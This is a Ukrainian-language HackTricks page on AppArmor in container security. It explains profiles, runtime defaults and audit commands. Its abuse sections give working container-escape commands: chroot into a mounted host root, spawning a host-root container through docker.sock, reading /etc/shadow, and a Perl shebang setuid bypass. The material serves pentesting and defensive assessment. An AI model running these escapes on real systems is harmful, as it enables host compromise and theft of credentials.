# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

AppArmor — це система **Mandatory Access Control**, яка застосовує обмеження через профілі для окремих програм. На відміну від традиційних перевірок DAC, що значною мірою залежать від власника та групи користувача, AppArmor дає змогу kernel застосовувати політику, прив'язану безпосередньо до process. У container environments це важливо, оскільки workload може мати достатні традиційні привілеї для спроби виконати певну дію, але все одно отримати відмову, якщо його AppArmor profile не дозволяє доступ до відповідного path, mount, network behavior або використання capability.

Найважливіший концептуальний момент полягає в тому, що AppArmor є **path-based**. Він визначає доступ до filesystem через правила для path, а не через labels, як це робить SELinux. Це робить його доступним для розуміння та потужним, але також означає, що bind mounts і альтернативні структури path потребують особливої уваги. Якщо той самий host content стає доступним за іншим path, результат застосування policy може відрізнятися від початкових очікувань operator.

## Роль в ізоляції контейнерів

Перевірки container security часто завершуються на capabilities і seccomp, але AppArmor залишається важливим і після цих перевірок. Уявімо container, який має більше privilege, ніж повинен, або workload, якому з operational reasons потрібна ще одна capability. AppArmor усе одно може обмежити file access, mount behavior, networking та execution patterns так, щоб зупинити очевидний шлях зловживання. Саме тому вимкнення AppArmor "just to get the application working" може непомітно перетворити просто ризиковану конфігурацію на таку, що активно exploitable.

## Лабораторна робота

Щоб перевірити, чи активний AppArmor на host, використайте:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Щоб перевірити, під яким користувачем виконується поточний процес контейнера:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Різниця є показовою. У звичайному випадку процес має показувати контекст AppArmor, пов’язаний із профілем, вибраним runtime. У випадку unconfined цей додатковий рівень обмежень зникає.

Також можна перевірити, що саме, на думку Docker, було застосовано:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Використання під час виконання

Docker може застосовувати профіль AppArmor за замовчуванням або кастомний профіль, якщо хост це підтримує. Podman також може інтегруватися з AppArmor у системах на базі AppArmor, хоча в дистрибутивах, орієнтованих на SELinux, інша MAC-система часто відіграє головну роль. Kubernetes може застосовувати політику AppArmor на рівні workload на вузлах, які фактично підтримують AppArmor. LXC та пов’язані з ним середовища system-container сімейства Ubuntu також широко використовують AppArmor.

Практичний висновок полягає в тому, що AppArmor — це не «функція Docker». Це функція ядра хоста, яку можуть застосовувати різні runtime. Якщо хост не підтримує її або runtime вказано запускати в режимі unconfined, заявлений захист фактично відсутній.

Для Kubernetes сучасним API є `securityContext.appArmorProfile`. Починаючи з Kubernetes `v1.30`, старі beta-анотації AppArmor вважаються deprecated. На підтримуваних хостах `RuntimeDefault` є профілем за замовчуванням, тоді як `Localhost` вказує на профіль, який уже має бути завантажений на вузлі. Це важливо під час перевірки, оскільки manifest може виглядати сумісним з AppArmor, але водночас повністю залежати від підтримки на стороні вузла та попередньо завантажених профілів.<sup>[[1]](#references)</sup>

Є одна малопомітна, але корисна операційна деталь: явне встановлення `appArmorProfile.type: RuntimeDefault` є суворішим, ніж просте пропущення цього поля. Якщо поле встановлено явно, а вузол не підтримує AppArmor, admission має завершитися помилкою. Якщо поле пропущено, workload все одно може запуститися на вузлі без AppArmor і просто не отримати цей додатковий рівень confinement. З погляду атакувальника, це вагома причина перевіряти як manifest, так і фактичний стан вузла.<sup>[[1]](#references)</sup>

На хостах з підтримкою AppArmor у Docker найвідомішим профілем за замовчуванням є `docker-default`. Цей профіль генерується з AppArmor-шаблону Moby і важливий тому, що пояснює, чому деякі capability-based PoC все одно не спрацьовують у контейнері за замовчуванням. У загальних рисах `docker-default` дозволяє звичайну роботу мережі, забороняє запис у значну частину `/proc`, забороняє доступ до чутливих частин `/sys`, блокує mount-операції та обмежує ptrace, щоб його не можна було використовувати як універсальний примітив для probing хоста. Розуміння цього baseline допомагає відрізнити «контейнер має `CAP_SYS_ADMIN`» від «контейнер справді може використати цю capability проти потрібних мені інтерфейсів ядра».

## Керування профілями

Профілі AppArmor зазвичай зберігаються в `/etc/apparmor.d/`. Поширене правило іменування полягає в заміні скісних рисок у шляху до executable на крапки. Наприклад, профіль для `/usr/bin/man` зазвичай зберігається як `/etc/apparmor.d/usr.bin.man`. Ця деталь важлива як для захисту, так і для assessment, оскільки після визначення назви активного профілю відповідний файл на хості часто можна швидко знайти.

Корисні команди керування на стороні хоста включають:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Причина, через яку ці команди важливі для довідника з container security, полягає в тому, що вони пояснюють, як саме створюються та завантажуються профілі, як їх переводити в complain mode і змінювати після оновлення застосунку. Якщо оператор має звичку переводити профілі в complain mode під час усунення несправностей і забувати відновити enforcement, контейнер може виглядати захищеним у документації, водночас фактично поводячись набагато менш обмежено.

### Створення та оновлення профілів

`aa-genprof` може спостерігати за поведінкою застосунку та допомагати інтерактивно створювати профіль:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` може згенерувати шаблонний профіль, який згодом можна завантажити за допомогою `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Коли бінарний файл змінюється й політику потрібно оновити, `aa-logprof` може відтворити заборони, знайдені в журналах, і допомогти оператору вирішити, дозволити їх чи заборонити:
```bash
sudo aa-logprof
```
### Логи

Заборони AppArmor часто можна побачити через `auditd`, syslog або такі інструменти, як `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Це корисно для операційних і наступальних цілей. Захисники використовують це для вдосконалення профілів. Attackers використовують це, щоб з’ясувати, який саме path або operation блокується, і чи є AppArmor засобом контролю, що блокує exploit chain.

### Визначення точного файлу профілю

Коли runtime показує конкретне ім’я профілю AppArmor для container, часто корисно зіставити це ім’я з файлом профілю на диску:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Це особливо корисно під час перевірки на стороні хоста, оскільки усуває розрив між твердженням «container повідомляє, що працює під профілем `lowpriv`» і фактом, що фактичні правила зберігаються в цьому конкретному файлі, який можна перевірити або перезавантажити.

### Правила з високою інформативністю для перевірки

Коли ви можете прочитати профіль, не обмежуйтеся простими рядками `deny`. Кілька типів правил суттєво змінюють те, наскільки ефективним буде AppArmor проти спроби escape з container:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: виконувати цільовий binary без обмежень. Якщо доступний helper, shell або interpreter дозволено через `ux`, це зазвичай перше, що слід перевірити.
- `px` / `Px` і `cx` / `Cx`: виконувати transitions профілю під час exec. Вони не є автоматично небезпечними, але їх варто перевірити, оскільки transition може перевести до значно ширшого профілю, ніж поточний.
- `change_profile`: дозволяє task перемикатися до іншого завантаженого профілю негайно або під час наступного exec. Якщо цільовий профіль слабший, це може стати передбаченим escape hatch із restrictive domain.
- `flags=(complain)`, `flags=(unconfined)` або новіший `flags=(prompt)`: вони мають впливати на рівень довіри до профілю. `complain` записує denials у log замість їх enforcement, `unconfined` прибирає boundary, а `prompt` залежить від decision path у userspace, а не від суто kernel-enforced deny.
- `userns` або `userns create,`: новіші policy AppArmor можуть контролювати створення user namespaces. Якщо профіль container явно дозволяє це, вкладені user namespaces залишаються можливими, навіть коли платформа використовує AppArmor як частину своєї hardening strategy.

Корисний grep на стороні хоста:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Такий аудит часто корисніший, ніж перегляд сотень звичайних правил для файлів. Якщо breakout залежить від виконання helper, переходу в новий namespace або виходу до менш обмежувального профілю, відповідь часто прихована саме в цих правилах, орієнтованих на переходи, а не в очевидних рядках на кшталт `deny /etc/shadow r`.

## Неправильні конфігурації

Найочевидніша помилка — `apparmor=unconfined`. Адміністратори часто встановлюють це під час налагодження application, яка не працювала, оскільки профіль правильно заблокував щось небезпечне або неочікуване. Якщо цей прапорець залишається у production, весь MAC layer фактично видалено.

Інша непомітна проблема — припущення, що bind mounts безпечні, оскільки дозволи на файли виглядають нормально. Оскільки AppArmor працює на основі шляхів, відкриття host paths під альтернативними mount locations може небезпечно взаємодіяти з path rules. Третя помилка — забути, що ім’я профілю в config file мало що означає, якщо kernel host фактично не enforcing AppArmor.

## Зловживання

Коли AppArmor відсутній, операції, які раніше були обмежені, можуть раптово почати працювати: читання sensitive paths через bind mounts, доступ до частин procfs або sysfs, використання яких мало залишатися складнішим, виконання mount-related actions, якщо capabilities/seccomp також це дозволяють, або використання paths, які профіль зазвичай забороняв би. AppArmor часто є механізмом, який пояснює, чому спроба breakout на основі capabilities «має працювати» теоретично, але все одно не працює на практиці. Видаліть AppArmor — і та сама спроба може почати успішно виконуватися.

Якщо ви підозрюєте, що AppArmor є основним механізмом, який зупиняє ланцюжок abuse на основі path-traversal, bind-mount або mount, першим кроком зазвичай є порівняння того, що стає доступним із профілем і без нього. Наприклад, якщо host path змонтовано всередині container, спочатку перевірте, чи можете ви перейти до нього та прочитати його:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Якщо контейнер також має небезпечну capability, як-от `CAP_SYS_ADMIN`, одним із найпрактичніших тестів є перевірка того, чи є AppArmor механізмом контролю, що блокує операції монтування або доступ до чутливих файлових систем ядра:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
У середовищах, де шлях хоста вже доступний через bind mount, втрата AppArmor також може перетворити read-only проблему розкриття інформації на прямий доступ до файлів хоста:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Суть цих команд не в тому, що AppArmor сам по собі створює escape. Вона полягає в тому, що після видалення AppArmor багато шляхів зловживання файловою системою та монтуваннями стають доступними для негайного тестування.

### Повний приклад: AppArmor вимкнено + кореневий каталог Host змонтовано

Якщо в контейнері кореневий каталог Host уже змонтовано через bind mount у `/host`, видалення AppArmor може перетворити заблокований шлях зловживання файловою системою на повний escape з Host:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Після того як shell виконується через файлову систему host, workload фактично вийшов за межі контейнера:
```bash
id
hostname
cat /etc/shadow | head
```
### Повний приклад: AppArmor вимкнено + Runtime Socket

Якщо справжнім бар'єром був AppArmor навколо стану runtime, змонтованого socket може бути достатньо для повного escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Точний шлях залежить від точки монтування, але кінцевий результат однаковий: AppArmor більше не перешкоджає доступу до runtime API, а runtime API може запустити контейнер, здатний скомпрометувати host.

### Повний приклад: обхід захисту за допомогою bind-mount на основі шляхів

Оскільки AppArmor працює на основі шляхів, захист `/proc/**` не забезпечує автоматичний захист того самого вмісту host procfs, якщо він доступний через інший шлях:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Вплив залежить від того, що саме змонтовано і чи дозволяє альтернативний шлях також обійти інші засоби контролю, але цей шаблон є однією з найочевидніших причин, чому AppArmor потрібно оцінювати разом із конфігурацією монтування, а не ізольовано.

### Повний приклад: Shebang Bypass

Політика AppArmor іноді націлена на шлях до інтерпретатора таким чином, що не повністю враховує виконання скриптів через обробку shebang. Історичний приклад передбачав використання скрипту, перший рядок якого вказує на інтерпретатор з обмеженнями:<sup>[[3]](#references)</sup>
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Такий приклад важливий як нагадування про те, що призначення profile та фактична семантика виконання можуть відрізнятися. Під час перевірки AppArmor у container environments особливу увагу слід приділяти ланцюжкам інтерпретаторів і альтернативним шляхам виконання.

## Перевірки

Мета цих перевірок — швидко відповісти на три запитання: чи увімкнено AppArmor на host, чи обмежено поточний процес і чи справді runtime застосував profile до цього container.
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Що тут є цікавого:

- Якщо `/proc/self/attr/current` показує `unconfined`, workload не отримує переваг від AppArmor confinement.
- Якщо `aa-status` показує, що AppArmor вимкнено або не завантажено, будь-яке ім'я профілю в runtime config здебільшого є косметичним.
- Якщо `docker inspect` показує `unconfined` або неочікуваний custom profile, це часто є причиною, чому працює шлях зловживання filesystem або mount.
- Якщо `/sys/kernel/security/apparmor/profiles` не містить профілю, якого ви очікували, конфігурації runtime або orchestrator самі по собі недостатньо.
- Якщо нібито hardened profile містить правила на кшталт `ux`, широкі `change_profile`, `userns` або `flags=(complain)`, практична межа може бути значно слабшою, ніж передбачає ім'я профілю.

Якщо container уже має elevated privileges з операційних причин, залишення AppArmor увімкненим часто визначає різницю між контрольованим винятком і значно масштабнішим security failure.

## Runtime Defaults

| Runtime / platform | Стан за замовчуванням | Поведінка за замовчуванням | Поширене ручне послаблення |
| --- | --- | --- | --- |
| Docker Engine | Увімкнено за замовчуванням на хостах із підтримкою AppArmor | Використовує AppArmor profile `docker-default`, якщо його не перевизначено | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Залежить від хоста | AppArmor підтримується через `--security-opt`, але точний стан за замовчуванням залежить від хоста/runtime і є менш уніфікованим, ніж документований `docker-default` profile у Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Умовний стан за замовчуванням | Якщо `appArmorProfile.type` не вказано, значенням за замовчуванням є `RuntimeDefault`, але його застосовано лише за увімкненого AppArmor на node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` зі слабким profile, nodes без підтримки AppArmor |
| containerd / CRI-O under Kubernetes | Залежить від підтримки node/runtime | Поширені runtimes, підтримувані Kubernetes, підтримують AppArmor, але фактичне enforcement усе одно залежить від підтримки node і налаштувань workload | Те саме, що в рядку Kubernetes; пряма конфігурація runtime також може повністю пропустити AppArmor |

Для AppArmor найважливішою змінною часто є **хост**, а не лише runtime. Налаштування profile у manifest не створює confinement на node, де AppArmor не увімкнено.

## References

- [1] [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [HTB: Nunchucks - AppArmor shebang bypass with a Perl script](https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html)

{{#include ../../../../banners/hacktricks-training.md}}
